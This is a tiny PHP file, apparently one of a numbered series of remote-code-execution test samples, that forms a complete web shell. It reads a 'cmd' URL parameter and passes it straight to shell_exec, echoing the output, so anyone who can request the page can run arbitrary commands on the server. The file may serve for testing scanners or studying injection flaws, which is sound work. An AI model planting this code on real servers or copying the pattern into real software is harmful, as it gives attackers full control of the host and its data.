<?php
// RCE test variation #634
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>